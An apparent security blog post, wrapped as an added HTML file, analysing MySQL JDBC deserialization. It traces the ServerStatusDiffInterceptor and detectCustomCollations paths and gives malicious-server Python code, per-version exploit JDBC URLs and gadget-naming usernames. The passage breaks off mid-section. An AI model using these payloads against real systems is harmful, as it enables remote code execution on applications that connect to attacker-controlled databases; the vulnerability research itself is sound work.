@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="stoocea" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  <meta name="description" content="time thicking away" />
+  
+  
+  
+  <title>
+    
+      JDBC-Mysql反序列化 
+      
+      
+      |
+    
+     stoocea&#39;s blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="https://bu.dusays.com/2024/08/09/66b6003e9e298.png">
+    <link rel="icon" href="https://bu.dusays.com/2024/08/09/66b6003e9e298.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="https://bu.dusays.com/2024/08/09/66b609e582b55.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Stoocea</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">JDBC-Mysql反序列化</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2024-08-09 18:22:17
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/JDBC/" title="JDBC">
+                    #JDBC
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>属于是必学项，但是不知道为什么学的这么晚。不过好歹还是开始了</p>
+<p>‍</p>
+<h1 id="Mysql-JDBC反序列化"><a href="#Mysql-JDBC反序列化" class="headerlink" title="Mysql-JDBC反序列化"></a>Mysql-JDBC反序列化</h1><h2 id="JDBC基础回顾"><a href="#JDBC基础回顾" class="headerlink" title="JDBC基础回顾"></a>JDBC基础回顾</h2><p>先看一段使用代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBCtest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//加载驱动。注意版本不同，Jdbc驱动的全类名路径就不同 如果是mysql-connector-java 6之后的版本就是我这个路径，如果6以前的版本，就是com.mysql.jdbc.Driver</span></span><br><span class="line">        String Driver=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;</span><br><span class="line">        Class.forName(Driver);</span><br><span class="line">        <span class="comment">//连接的访问路径 JDBC特定路径</span></span><br><span class="line">        String url=<span class="string">&quot;jdbc:mysql://localhost:3306/jdbc?characterEncoding=utf8&amp;useSSL=true&amp;serverTimezone=GMT%2B8&quot;</span>;</span><br><span class="line">        <span class="comment">//进行连接</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">        Statement statement=conn.createStatement();</span><br><span class="line">		<span class="comment">//利用conn连接成功后的功能对象，进行SQL语句查询</span></span><br><span class="line">        ResultSet rs=statement.executeQuery(<span class="string">&quot;select * from users&quot;</span>);</span><br><span class="line">        <span class="comment">//循环遍历结果集，之后一一输出</span></span><br><span class="line">		<span class="keyword">while</span>(rs.next())&#123;</span><br><span class="line">            System.out.println(rs.getString(<span class="string">&quot;username&quot;</span>)+<span class="string">&quot; : &quot;</span>+rs.getString(<span class="string">&quot;password&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一般来说这一段正常的SQL查询业务逻辑，我们能够控制的只有executeQuery中的参数，哪里出现的反序列化漏洞呢？</p>
+<p>漏洞描述以及原文是这么说的：</p>
+<blockquote>
+<p>(若攻击者能控制JDBC连接设置项，则可以通过设置其配置指向恶意MySQL服务器触发ObjectInputStream.readObject()，构造反序列化利用链从而造成RCE。<br>通过JDBC连接MySQL服务端时，会有几句内置的查询语句需执行，其中两个查询的结果集在MySQL客户端进行处理时会被ObjectInputStream.readObject()进行反序列化处理。如果攻击者可以控制JDBC连接设置项，那么可以通过设置其配置指向恶意MySQL服务触发MySQL JDBC客户端的反序列化漏洞。</p>
+</blockquote>
+<p>总结一下原意就是JDBC在连接Mysql服务端的时候，会有几句内置的语句执行，这几句执行过后查询到的结果会在客户端进行readObject反序列化处理。参数控制在JDBC连接配置项中。可以被利用的查询语句有这两项：SHOW SESSION STATUS ；SHOW COLLATION，这两种会在之后的具体代码跟进中体现</p>
+<p>既然我们能够控制的参数是JDBC连接项，首先先对几个与该漏洞有关的连接项进行分析（<code>com.mysql.cj.conf。PropertyDefinitions</code>​的源码中有详细定义）：</p>
+<ol>
+<li>statementInterceptors：用于指定拦截器在SQL执行中和结果返回之前进行逻辑处理，在8.0之后的版本被queryInterceptors代替</li>
+<li>queryInterceptors,8.0之后替代了statementInterceptors的工作，实际上作用相同</li>
+<li>autoDeserialize：设置之后驱动器才能够自动识别含有BLOB的报文，并且反序列化</li>
+<li>detectCustomCollations：原本的意思是指是否检测服务器上安装的自定义字符集和排序规则，如果该选项为ture，驱动程序会在每次建立连接的时候获取其自定义字符集合排序规则。</li>
+</ol>
+<p>利用点在Interceptors和detectCustomCollations中，我们一个一个来</p>
+<p>‍</p>
+<p>下面的测试依赖版本:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">8.0</span><span class="number">.12</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ServerStatusDiffInterceptor"><a href="#ServerStatusDiffInterceptor" class="headerlink" title="ServerStatusDiffInterceptor"></a>ServerStatusDiffInterceptor</h2><h3 id="漏洞点探索"><a href="#漏洞点探索" class="headerlink" title="漏洞点探索"></a>漏洞点探索</h3><p>漏洞描述上说在连接数据MySQL服务端时，会有几句内置的查询语句需执行，也就是SQL query，一般包含。本身ServerStatusDiffInterceptor属于Interceptor，当我们执行SQL query的时候，就会触发Interceptor的preProcessor的方法。</p>
+<p>最开始跟进DriverManager的getConnection，开始创建ConnectionImpl对象的时候，要根据JDBC启动项的URL中提取出启动项，封装为propertySet。当然还有一些必须要在SQL服务器上执行SQL语句之后获得结果才能设置。调用栈如下。其实整体还是在完成ConnectionImpl的创建。</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240806141335-cuba2h6.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>具体的话在ConnectionImpl的setAutoCommit方法中，会调用到 SET autocommit等SQL语句的执行。该方法的主要作用是为了将每一个SQL请求当作一个独立的事务自动提交。也就是适用于简单操作。</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240806223911-24iwmpw.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>之后跟进execSQL，在trycatch块中利用本地协议调用sendQueryString发送SQL请求， 前面的逻辑包括初始化设置以及检测连接状态等等</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240806223937-41joe0v.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>sendQueryString中的内容也只是根据此时的set autocommit等请求参数封装一下请求，后续跟进sendQueryPacket方法，发现调用了invokeQueryInterceptorPre，也就是ServerStatusDiffInterceptor的preProcess方法</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240806224036-7lua189.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>经过两次跟进（因为有一层NoSubInterceptorWrapper的封装）到ServerStatusDiffInterceptor的preProcess方法</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240806224102-vjmqh5b.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>之后跟进populateMapWithSessionStatusValues的内容就是重头戏了，前面理解一下思路和为什么这么调就好。</p>
+<p>这里的this.connection其实就是封装的ConnectionImpl，所以执行SQL的必要步骤还是一样–获取一个statement对象，然后去executeSQL语句，用结果集接收之后，调用resultSetToMap，将结果集进行map键值对处理</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240806223623-nbxfn9t.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>跟进resultSetToMap，在put方法中会发现他会对结果集调用getObject方法</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240806223552-52j00g1.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>继续跟进getObject方法，此时的结果集会将刚才执行set Autocommit执行结果序列化存储进行反序列化操作，漏洞点就是出在这。</p>
+<p>一个是BITcase的情况</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240806223451-pq3xizm.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>另外一个是BLOB类型的情况：</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240807092516-xluxbou.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>两者唯一的不同在于它数据包里面写的是BLOB还是BIT而已，执行逻辑其实是一样的</p>
+<p>既然已经找到了具体的反序列化点，现在还需要保证两个点：</p>
+<ol>
+<li>JDBC在getConnection以及ConnectionImpl的实例化过程中和服务端进行的通信流程不能断，也就是我们要确保代码能够执行到这</li>
+<li>ServerStatusDiffInterceptor在执行preProcess进行SQL查询获取到的结果必须是我们绑定好的恶意序列化数据</li>
+</ol>
+<p>下面一个一个来解决</p>
+<h3 id="伪造通信流程"><a href="#伪造通信流程" class="headerlink" title="伪造通信流程"></a>伪造通信流程</h3><p>这个流程其实就涉及到我们刚才一路跟进的过程，除去前面的流程，我们先来看getObject中的限制。</p>
+<p>在getObject中有这么几个需要注意的地方，首先就是BIT选项，依然还是execSQL之后通过获取到的结果数据字节来判断是否为BIT类型，然后再读取<code>columnIndexMinusOne</code>​的值，也就是在<code>resultSetToMap</code>​中调用的两次getObject，他们给的参数第一个是1，第二个getObject是2，也就是说第一次进入getObject肯定是不能进入BIT选项进行反序列化的，会直接return null。所以需要我们将恶意数据存储到结果集的第二选项中。然后是对于<code>PNAME_autoDeserialize</code>​值，也就是我们启动项中<code>?autoDeserialize=true</code>​的原因，不然就无法进入if判断进行反序列化。</p>
+<p>看完了getObject，我们留到最后去解决，现在回到最开始我们一路创建ConnectionImpl的开始的过程，看看我们为了伪造恶意SQL服务端还需要伪造哪些数据。这里涉及到MySQL的JDBC的认证流程，科学上网了解一下即可。</p>
+<p>首先就是先访问和登录数据库，检测连接状态，这里还是比较好认的</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240806223239-e2c2j5q.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240806170205-gjussjc.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>首先是服务端发送的一段初始握手报文–Server Greeting，包含一系列的用于认证身份，密码加盐索要用到的值，以及确定当前认证插件的的名称等等。在此之后，客户端开始向我们发送了一段Login Request的包，主要信息包含客户端填入的username和加盐之后的密码，以及所用到的插件等等</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240807100503-nm9wo4t.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>之后服务端认证成功之后，返回一段Response-OK包，具体内容如图，整体的16进制形式每次Mysql-JDBC的连接都是相同的<code>0700000200000002000000</code>​</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240807094437-9k5d7a9.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>之后代码调试界面一路跟进，又在ConnectionImpl的loadServerVariables方法中，发送了两段用来封装客户端属性的请求信息，其中都是用来在服务端需要执行的SQL语句，特殊关键词包括<code>select @session.auto_increment_increment</code>​</p>
+<p>第一段请求信息之后的返回报文如下：从01 00开始后面所有的数据都是而服务端需要返回的</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240807103827-3rg8ejh.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>第二段发送过来的SQL执行请求只有一句话 <code>show warnings</code>​,返回报文如下，依然还是0100之后的所有数据都是我们需要返回的</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240807104434-s35it0o.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>之后继续跟进代码，经过多次调试，其实直到最后的<code>SHOW SESSION STATUS</code>​之前，请求的信息和发包内容都是相同的，因为代码走的流程相同，所以之后总结一下前面的服务器返回包内容以及对应的客户端请求即可。</p>
+<p>最后的<code>show session status</code>​指令返回包的结果集该如何构造呢？具体的代码如下，引用一下各大文章中出现的最多的伪造恶意SQL服务器代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">               mysql_data = <span class="string">&#x27;0100000102&#x27;</span> </span><br><span class="line">               mysql_data += <span class="string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">               mysql_data += <span class="string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">               <span class="comment">#获取payload</span></span><br><span class="line">               payload_content=get_payload_content()</span><br><span class="line">               <span class="comment">#计算payload长度</span></span><br><span class="line">               payload_length = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">               payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">               <span class="comment">#计算数据包长度</span></span><br><span class="line">               data_len = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">               data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">               mysql_data += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span>+ payload_length_hex</span><br><span class="line">               mysql_data += <span class="built_in">str</span>(payload_content)</span><br><span class="line">               mysql_data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">               send_data(conn, mysql_data)</span><br><span class="line">               data = receive_data(conn)</span><br></pre></td></tr></table></figure>
+
+<p>首先了解一下Mysql的结果集响应包的结构</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240807134758-kt69nks.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240807135013-s0f20m7.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>具体的构造我也没太深入研究了，第一列的数据<code>0100000102</code>​主要作用就是标识我们存在两列的具体信息。第二列和第三列就是具体的每列信息的列定义，唯一的区别就在于各自的行号数据不同，一个是02，一个是03。然后是EOF的包的问题，如果在这两列列定义之后直接下构造好的EOF包会打不通，我也遇到了这个问题，稍微研究了一下代码层面的问题，如果按照已有的规则添加上EOF包，会存在resultSet中不存在值的情况，也就是提前结束的内容的读取，不知道是否是我构造的问题还是其他问题。</p>
+<p>然后就是在最后执行的时候一些细节问题</p>
+<p>一是，在<code>mappedValues.put(rs.getObject(1), rs.getObject(2));</code>​中，第一次getObject进来肯定会直接进入到if(this.thisRow.getNull(columnIndexMinusOne))的判断中（我截图里面第二次getObject了），所以会直接返回null</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240807143109-fs9ua11.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>然后是-84和-19标识的就是AC ED，两个字节代表java序列化数据的标识</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240807143101-1m4t6tf.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>其实构造起来了解一下基本的流程就行，后续还是工具去利用了，简化一些步骤，用到了许少写的工具，然后发现了一个可能是小bug的地方</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/4ra1n/mysql-fake-server/releases/tag/0.0.4">https://github.com/4ra1n/mysql-fake-server/releases/tag/0.0.4</a></p>
+<p>使用时候注意用户名按照工具里面的生成的规则来写就行，其他就按照正常的payload写就没问题。因为用户名要用于提取Gadget对应name</p>
+<h3 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h3><h4 id="8-0-7-8-0-20"><a href="#8-0-7-8-0-20" class="headerlink" title="8.0.7-8.0.20"></a>8.0.7-8.0.20</h4><p>综合了一下上面的利用过程，不过多赘述</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">String Driver=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;</span><br><span class="line">       Class.forName(Driver);</span><br><span class="line">       <span class="comment">//连接的访问路径</span></span><br><span class="line">       String url=<span class="string">&quot;jdbc:mysql://127.0.0.1:3309/jdbc?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;serverTimezone=UTC&amp;useSSL=false&quot;</span>;</span><br><span class="line">       <span class="comment">//进行连接</span></span><br><span class="line">       <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">       Statement statement=conn.createStatement();</span><br><span class="line">       ResultSet rs=statement.executeQuery(<span class="string">&quot;select * from users&quot;</span>);</span><br><span class="line">       <span class="keyword">while</span>(rs.next())&#123;</span><br><span class="line">           System.out.println(rs.getString(<span class="string">&quot;username&quot;</span>)+<span class="string">&quot; : &quot;</span>+rs.getString(<span class="string">&quot;password&quot;</span>));</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-0-2-6-0-6"><a href="#6-0-2-6-0-6" class="headerlink" title="6.0.2-6.0.6"></a>6.0.2-6.0.6</h4><p>6.x的版本总计这么多，其实我不太明白为甚没有7的版本，直接从6跳到8了</p>
+<p>这里payload的更换的主要原因是queryInterceptors参数更换为了statementInterceptors，其他倒是没有什么不同</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://ip:port/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=base64ZGVzZXJfQ0MzMV9jYWxj&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;base64ZGVzZXJfQ0MzMV9jYWxj&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure>
+
+<p>5.x之后都是最开始的5.1.10及以下作为一段，5.1.10以上作为一段，起初我一直在担心一个问题，就是不同版本下，直到最后<code>SHOW SESSION STATUS</code>​之前的流程，客户端所发过来的包会不会有所不同，那我们是否需要根据情况的不同来选择构造不同的回显包呢?带着这样的问题我去调试了一下，客户端发包到伪造服务端开启新线程进行逻辑处理，双向调试的流程下，发现其实不论哪个版本，前几个流程都是一样的。所以就不存在我刚才上面提到的问题。</p>
+<p>但是5.x之后的版本有一点肯定是变的，mysql-jdbc的包名变了，所以相应的payload也在变</p>
+<p>‍</p>
+<h4 id="5-1-11-5-1x后续版本"><a href="#5-1-11-5-1x后续版本" class="headerlink" title="5.1.11-5.1x后续版本"></a>5.1.11-5.1x后续版本</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3308/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;deser_CC31_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-1-0-5-1-10"><a href="#5-1-0-5-1-10" class="headerlink" title="5.1.0-5.1.10"></a>5.1.0-5.1.10</h4><p>唯一的区别在于，触发点不在getConnection了，而是在后续的<code>statement.executeQuery</code>​中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://ip:port/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=base64ZGVzZXJfQ0MzMV9jYWxj&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;base64ZGVzZXJfQ0MzMV9jYWxj&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br><span class="line"> <span class="keyword">while</span>(rs.next())&#123;</span><br><span class="line">            System.out.println(rs.getString(<span class="string">&quot;username&quot;</span>)+<span class="string">&quot; : &quot;</span>+rs.getString(<span class="string">&quot;password&quot;</span>));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我调试了一下，在5.1.2版本为例，这里初始化<code>initializeStatementInterceptors</code>​的过被放到了createNewIO里面，就导致了内置的SQL语句–SetAutoCommit执行时就不会调用到<code>Interceptors</code>​的逻辑。</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240808152223-4e5adzb.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>之后再调用<code>ResultSet rs=statement.executeQuery(&quot;select * from users&quot;);</code>​的时候，由于statement的executeQuery方法是调用到了ConnectionImpl的executeqeuery方法，在执行的过程中，调用到MysqlIO的时候，会判断this.statementInterceptors是否存在，如果存在才会去调用其preProcess</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240808153720-1bmxl1u.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>所以理论上，只要我们在初始化ConnectionImpl的时候指定了Interceptor的话，之后利用ConnectionImpl进行SQL执行，并且将结果都，都会触发我们的反序列化。所以总的来说，ServerStatusDiffInterceptor的方式是利用了ConnectionImpl在初始化的时候，接受了不受信任的Interceptor进行初始化，并且也接受了不受信任的Mysql地址，进而造成了查询结果的反序列化。</p>
+<p>然后利用的话也需要目标环境具有对应的依赖才能顺利执行。</p>
+<p>总结下来Mysql的认证过程需要下面这几个部分我们来伪造：</p>
+<ol>
+<li>Greeting信息需要我们主动发送</li>
+<li>Greeting认证成功之后，发送OK package。客户端发送连接插件信息，也就是<code>mysql-connector-java</code>​的版本信息等</li>
+<li>伪造对应的信息：<code>max_allowed_packet</code>​ <code>system_time_zone</code>​等，并且发送</li>
+<li>客户端发送<code>SHOW SESSION STATUS</code>​信息，伪造对应的结果集数据包，然后发送</li>
+</ol>
+<p>‍</p>
+<h2 id="detectCustomCollations"><a href="#detectCustomCollations" class="headerlink" title="detectCustomCollations"></a>detectCustomCollations</h2><p>此时的Mysql-JDBC版本是6.0.3，属于可干范围。</p>
+<h3 id="漏洞流程解析"><a href="#漏洞流程解析" class="headerlink" title="漏洞流程解析"></a>漏洞流程解析</h3><p>流程还是比较简单的，跟Interceptor的利用有着异曲同工之妙，都是请求获取数据之后，在本地对结果进行反序列化</p>
+<p>正常走流程，直接跟进到ConnectionImpl的初始化逻辑，并且走进熟悉的createIO方法，一路跟进到connectOneTryOnly方法，也就是和服务端建立通信连接并且执行几句SQL获取服务端的配置信息之后，继续跟进<code>initializePropsFromServer()</code>​方法</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240808163721-z4pbfw0.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>来到buildCollationMapping</p>
